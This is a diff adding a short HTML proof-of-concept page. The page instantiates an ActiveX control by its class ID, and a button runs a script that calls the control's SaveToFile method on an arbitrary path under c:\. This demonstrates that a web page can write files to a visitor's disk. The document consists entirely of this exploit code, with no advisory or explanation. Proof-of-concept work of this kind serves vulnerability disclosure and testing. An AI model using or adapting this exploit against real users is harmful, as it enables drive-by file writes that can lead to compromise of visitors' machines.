@@ -1,0 +1,18 @@
+<HTML>
+<BODY>
+  <object id=ctrl 
+classid="clsid:{C22BB435-9B7F-4B1F-ACBD-CD36D34D6DFF}"></object>
+                           
+<SCRIPT>
+
+function Poc()
+ {
+    arg2="c:\\arbitrary_file.txt"
+    ctrl.SaveToFile(arg2)
+ }
+
+</SCRIPT>
+<input language=JavaScript onclick=Poc() type=button value="Proof of 
+Concept">
+</BODY>
+</HTML>
